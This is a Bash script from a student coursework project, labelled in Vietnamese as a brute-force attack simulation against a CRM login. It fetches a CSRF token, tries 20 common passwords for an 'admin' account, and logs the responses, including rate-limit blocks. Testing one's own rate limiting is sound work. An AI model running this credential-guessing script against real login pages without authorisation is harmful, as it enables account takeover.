#!/bin/bash
# ==============================================================================
# Kịch bản mô phỏng tấn công Brute-Force vào hệ thống CRM
# Đề tài 4 - Môn Triển khai và Quản trị Hệ thống Phần mềm
# MSSV: dtc245340007 - NGUYEN THI QUYNH THO
# ==============================================================================

set -e

TARGET_URL="${1:-https://localhost/login}"
ATTACK_USER="${2:-admin}"
TOTAL_ATTEMPTS=20
DELAY=0.5
COOKIE_JAR=$(mktemp)

echo "===================================================================="
echo " [START] KỊCH BẢN MÔ PHỎNG TẤN CÔNG BRUTE-FORCE XÁC THỰC"
echo " Mục tiêu: $TARGET_URL"
echo " Tài khoản mục tiêu: $ATTACK_USER"
echo " Số lượng request: $TOTAL_ATTEMPTS"
echo " Khoảng cách gửi: ${DELAY}s"
echo " Thời gian bắt đầu: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
echo "===================================================================="

PASSWORDS=(
  "123456" "password" "12345678" "admin123" "qwerty"
  "letmein" "welcome1" "monkey" "football" "iloveyou"
  "secret123" "trustno1" "superman" "batman2026" "dragon"
  "shadow" "master" "hacker123" "crmpass2026" "wrongpass99"
)

# Bước 1: Khởi tạo phiên và lấy CSRF Token
echo "[1/2] Đang kết nối tới $TARGET_URL để nhận CSRF Token và Session Cookie..."
LOGIN_HTML=$(curl -k -s -c "$COOKIE_JAR" "$TARGET_URL")
CSRF_TOKEN=$(echo "$LOGIN_HTML" | grep 'name="csrf_token"' | sed -E 's/.*value="([^"]+)".*/\1/')

if [ -z "$CSRF_TOKEN" ]; then
  echo "[-] LỖI: Không trích xuất được csrf_token từ trang login!"
  rm -f "$COOKIE_JAR"
  exit 1
fi

echo "[+] CSRF Token: ${CSRF_TOKEN:0:16}... (Đã trích xuất thành công)"
echo ""
echo "[2/2] Bắt đầu gửi liên tiếp $TOTAL_ATTEMPTS requests đăng nhập sai..."
echo "--------------------------------------------------------------------"
printf "%-4s | %-12s | %-15s | %-8s | %-20s\n" "STT" "Thời gian" "Password Thử" "HTTP" "Kết quả"
echo "--------------------------------------------------------------------"

START_TIME=$(date +%s)

for i in $(seq 1 $TOTAL_ATTEMPTS); do
  PWD_TEST="${PASSWORDS[$((i - 1))]}"
  NOW=$(date +"%T")
  
  # Gửi POST request đăng nhập sai
  HTTP_CODE=$(curl -k -s -o /tmp/resp_$$.html -w "%{http_code}" \
    -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    -X POST "$TARGET_URL" \
    -d "csrf_token=$CSRF_TOKEN" \
    -d "username=$ATTACK_USER" \
    -d "password=$PWD_TEST")
  
  # Trích xuất thông báo lỗi nếu có
  if grep -q "Tên đăng nhập hoặc mật khẩu không chính xác" /tmp/resp_$$.html 2>/dev/null; then
    RESULT="Sai mật khẩu (401/200)"
  elif [ "$HTTP_CODE" -eq 429 ]; then
    RESULT="Bị chặn Rate Limit (429)"
  else
    RESULT="HTTP Code: $HTTP_CODE"
  fi
  
  printf "%-4s | %-12s | %-15s | %-8s | %-20s\n" "#$i" "$NOW" "$PWD_TEST" "$HTTP_CODE" "$RESULT"
  rm -f /tmp/resp_$$.html
  
  sleep $DELAY
done

END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

rm -f "$COOKIE_JAR"

echo "--------------------------------------------------------------------"
echo " [HOÀN TẤT] Đã gửi đủ $TOTAL_ATTEMPTS requests trong ${DURATION}s."
echo " Thời gian kết thúc: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
echo "===================================================================="
